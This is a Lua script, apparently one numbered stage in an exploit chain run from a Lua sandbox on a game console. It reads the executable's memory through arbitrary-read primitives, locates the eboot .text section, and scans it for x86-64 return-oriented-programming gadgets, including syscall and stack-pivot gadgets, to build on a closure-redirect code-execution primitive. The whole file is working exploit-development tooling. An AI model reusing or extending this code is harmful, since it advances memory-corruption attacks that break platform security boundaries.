-- CRASH_CLASS: LOW
-- PROBE 56d: Eboot gadget scan for CClosure redirect chain
--
-- Eboot .text is RX (readable + executable). We can scan it for useful
-- x86-64 gadgets. CClosure +0x20 redirect (56c/56f) lets us call any
-- function at an eboot address by redirecting a Lua C function.
--
-- We need: ret, pop rdi;ret, pop rsi;ret, pop rdx;ret, syscall;ret,
-- mov rdi,rax;ret, xor eax,eax;ret, and ideally pop rsp;ret for pivoting.
--
-- Scan strategy: read eboot .text in 4-byte dwords, look for byte patterns.

print("=== PROBE 56d: EBOOT GADGET SCAN ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end

local stub = syscall.pipe.fn_addr
local pid = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid)

local function alive()
    return N(native.fcall_with_rax(stub, 20)) == pid
end

-- Get eboot base via dynlib_get_info(593)
local info = memory.alloc(0x200)
wd(N(info), 0x160)
local sc_info = mk(593)
pcall(function() sc_info(uint64(0), info) end)

local text_lo = rd(N(info) + 0x108) or 0
local text_hi = rd(N(info) + 0x10C) or 0
local text_size_lo = rd(N(info) + 0x110) or 0
local text_size_hi = rd(N(info) + 0x114) or 0

if text_lo < 0 then text_lo = text_lo + 0x100000000 end
if text_hi < 0 then text_hi = text_hi + 0x100000000 end
if text_size_lo < 0 then text_size_lo = text_size_lo + 0x100000000 end

local eboot_base = uint64(string.format("0x%X%08X", text_hi, text_lo))
local eboot_size = text_size_lo

print(string.format("eboot .text base=0x%X%08X size=0x%X", text_hi, text_lo, eboot_size))
if eboot_size == 0 or eboot_size > 0x2000000 then
    print("ERROR: bad eboot size")
    return
end

-- Gadget patterns (looking for byte sequences within dwords)
-- C3          = ret
-- 5F C3       = pop rdi; ret
-- 5E C3       = pop rsi; ret
-- 5A C3       = pop rdx; ret
-- 58 C3       = pop rax; ret
-- 59 C3       = pop rcx; ret
-- 41 5C C3    = pop r12; ret
-- 41 5E C3    = pop r14; ret
-- 0F 05 C3    = syscall; ret
-- 0F 05       = syscall (even without ret, useful)
-- C3 CC       = ret; int3 (padded ret)
-- 48 89 C7 C3 = mov rdi, rax; ret
-- 48 89 F7 C3 = mov rdi, rsi; ret
-- 31 C0 C3    = xor eax, eax; ret
-- 48 31 C0 C3 = xor rax, rax; ret
-- 5C C3       = pop rsp; ret (stack pivot!)

-- We scan dwords and check all byte positions within each pair of adjacent dwords
-- to find 2-byte, 3-byte, and 4-byte gadgets.

local gadgets = {}
local MAX_GADGETS = 200
local found_count = 0

-- Scan in chunks to avoid timeout
local CHUNK = 0x40000  -- 256KB chunks
local total_chunks = math.floor(eboot_size / CHUNK)
if eboot_size % CHUNK > 0 then total_chunks = total_chunks + 1 end

print(string.format("scanning %d chunks of 0x%X bytes", total_chunks, CHUNK))

for chunk_idx = 0, total_chunks - 1 do
    if found_count >= MAX_GADGETS then break end
    if not alive() then print("DIED during scan!") return end

    local chunk_off = chunk_idx * CHUNK
    local chunk_end = chunk_off + CHUNK
    if chunk_end > eboot_size then chunk_end = eboot_size end

    -- Read dwords and scan for patterns
    local prev_dw = nil
    for off = chunk_off, chunk_end - 4, 4 do
        local dw = rd(N(eboot_base) + off)
        if dw == nil then break end
        if dw < 0 then dw = dw + 0x100000000 end

        -- Extract bytes: b0 is lowest byte
        local b0 = dw % 256
        local b1 = math.floor(dw / 256) % 256
        local b2 = math.floor(dw / 65536) % 256
        local b3 = math.floor(dw / 16777216) % 256

        -- Check 2-byte gadgets starting at each byte position
        -- Position 0: b0,b1
        -- Position 1: b1,b2
        -- Position 2: b2,b3

        local function record(name, byte_off)
            if found_count >= MAX_GADGETS then return end
            local addr_off = off + byte_off
            local key = name
            if not gadgets[key] then
                gadgets[key] = {}
            end
            if #gadgets[key] < 5 then  -- keep up to 5 instances per type
                gadgets[key][#gadgets[key] + 1] = addr_off
                found_count = found_count + 1
            end
        end

        -- 2-byte gadgets: XX C3
        if b1 == 0xC3 then
            if b0 == 0x5F then record("pop_rdi_ret", 0)
            elseif b0 == 0x5E then record("pop_rsi_ret", 0)
            elseif b0 == 0x5A then record("pop_rdx_ret", 0)
            elseif b0 == 0x58 then record("pop_rax_ret", 0)
            elseif b0 == 0x59 then record("pop_rcx_ret", 0)
            elseif b0 == 0x5B then record("pop_rbx_ret", 0)
            elseif b0 == 0x5C then record("pop_rsp_ret", 0)
            elseif b0 == 0x5D then record("pop_rbp_ret", 0)
            end
        end
        if b2 == 0xC3 then
            if b1 == 0x5F then record("pop_rdi_ret", 1)
            elseif b1 == 0x5E then record("pop_rsi_ret", 1)
            elseif b1 == 0x5A then record("pop_rdx_ret", 1)
            elseif b1 == 0x58 then record("pop_rax_ret", 1)
            elseif b1 == 0x59 then record("pop_rcx_ret", 1)
            elseif b1 == 0x5B then record("pop_rbx_ret", 1)
            elseif b1 == 0x5C then record("pop_rsp_ret", 1)
            elseif b1 == 0x5D then record("pop_rbp_ret", 1)
            end
        end
        if b3 == 0xC3 then
            if b2 == 0x5F then record("pop_rdi_ret", 2)
            elseif b2 == 0x5E then record("pop_rsi_ret", 2)
            elseif b2 == 0x5A then record("pop_rdx_ret", 2)
            elseif b2 == 0x58 then record("pop_rax_ret", 2)
            elseif b2 == 0x59 then record("pop_rcx_ret", 2)
            elseif b2 == 0x5B then record("pop_rbx_ret", 2)
            elseif b2 == 0x5C then record("pop_rsp_ret", 2)
            elseif b2 == 0x5D then record("pop_rbp_ret", 2)
            end
        end

        -- 3-byte gadgets: check across dword boundary too
        -- 0F 05 C3 = syscall; ret
        if b0 == 0x0F and b1 == 0x05 and b2 == 0xC3 then record("syscall_ret", 0) end
        if b1 == 0x0F and b2 == 0x05 and b3 == 0xC3 then record("syscall_ret", 1) end

        -- 31 C0 C3 = xor eax, eax; ret
        if b0 == 0x31 and b1 == 0xC0 and b2 == 0xC3 then record("xor_eax_ret", 0) end
        if b1 == 0x31 and b2 == 0xC0 and b3 == 0xC3 then record("xor_eax_ret", 1) end

        -- 0F 05 = syscall (without ret)
        if b0 == 0x0F and b1 == 0x05 then record("syscall_bare", 0) end
        if b1 == 0x0F and b2 == 0x05 then record("syscall_bare", 1) end
        if b2 == 0x0F and b3 == 0x05 then record("syscall_bare", 2) end

        -- 4-byte gadgets
        -- 48 89 C7 C3 = mov rdi, rax; ret
        if b0 == 0x48 and b1 == 0x89 and b2 == 0xC7 and b3 == 0xC3 then
            record("mov_rdi_rax_ret", 0)
        end
        -- 48 89 F7 C3 = mov rdi, rsi; ret
        if b0 == 0x48 and b1 == 0x89 and b2 == 0xF7 and b3 == 0xC3 then
            record("mov_rdi_rsi_ret", 0)
        end
        -- 48 31 C0 C3 = xor rax, rax; ret
        if b0 == 0x48 and b1 == 0x31 and b2 == 0xC0 and b3 == 0xC3 then
            record("xor_rax_rax_ret", 0)
        end
        -- 48 89 E7 C3 = mov rdi, rsp; ret
        if b0 == 0x48 and b1 == 0x89 and b2 == 0xE7 and b3 == 0xC3 then
            record("mov_rdi_rsp_ret", 0)
        end

        -- Cross-dword: check prev_dw's last bytes + this dw's first bytes
        if prev_dw then
            local p2 = math.floor(prev_dw / 65536) % 256
            local p3 = math.floor(prev_dw / 16777216) % 256

            -- p3, b0 = 2-byte across boundary
            if b0 == 0xC3 then
                if p3 == 0x5F then record("pop_rdi_ret_x", off - 1)
                elseif p3 == 0x5E then record("pop_rsi_ret_x", off - 1)
                elseif p3 == 0x5A then record("pop_rdx_ret_x", off - 1)
                elseif p3 == 0x58 then record("pop_rax_ret_x", off - 1)
                elseif p3 == 0x5C then record("pop_rsp_ret_x", off - 1)
                end
            end

            -- p2,p3,b0 = 3-byte across boundary
            if p2 == 0x0F and p3 == 0x05 and b0 == 0xC3 then
                record("syscall_ret_x", off - 2)
            end
            -- p3,b0,b1 = 3-byte across boundary
            if p3 == 0x0F and b0 == 0x05 and b1 == 0xC3 then
                record("syscall_ret_x2", off - 1)
            end
        end

        prev_dw = dw
    end

    if chunk_idx % 4 == 0 then
        print(string.format("  chunk %d/%d scanned, %d gadgets found",
            chunk_idx + 1, total_chunks, found_count))
    end
end

if not alive() then print("DIED!") return end

-- Report all found gadgets
print("")
print("=== GADGET CATALOG ===")
local sorted = {}
for name, offsets in pairs(gadgets) do
    sorted[#sorted + 1] = {name, offsets}
end
table.sort(sorted, function(a, b) return a[1] < b[1] end)

for _, entry in ipairs(sorted) do
    local name, offsets = entry[1], entry[2]
    local parts = {}
    for _, off in ipairs(offsets) do
        parts[#parts + 1] = string.format("+0x%X", off)
    end
    print(string.format("  %-25s [%d] %s", name, #offsets, table.concat(parts, " ")))
end

-- Verify a few key gadgets by reading their actual bytes
print("")
print("=== GADGET VERIFICATION ===")
local verify_list = {"pop_rdi_ret", "pop_rsi_ret", "pop_rdx_ret", "pop_rax_ret",
    "syscall_ret", "syscall_bare", "pop_rsp_ret", "xor_eax_ret"}

for _, name in ipairs(verify_list) do
    local offsets = gadgets[name]
    if offsets and #offsets > 0 then
        local off = offsets[1]
        local addr = N(eboot_base) + off
        local d0 = rd(addr) or 0
        if d0 < 0 then d0 = d0 + 0x100000000 end
        local d1 = rd(addr + 4) or 0
        if d1 < 0 then d1 = d1 + 0x100000000 end
        print(string.format("  %-25s +0x%X bytes: %08X %08X", name, off, d0, d1))
    else
        print(string.format("  %-25s NOT FOUND", name))
    end
end

print("")
print("canary=" .. (alive() and "OK" or "FAIL"))
print("=== 56d COMPLETE ===")
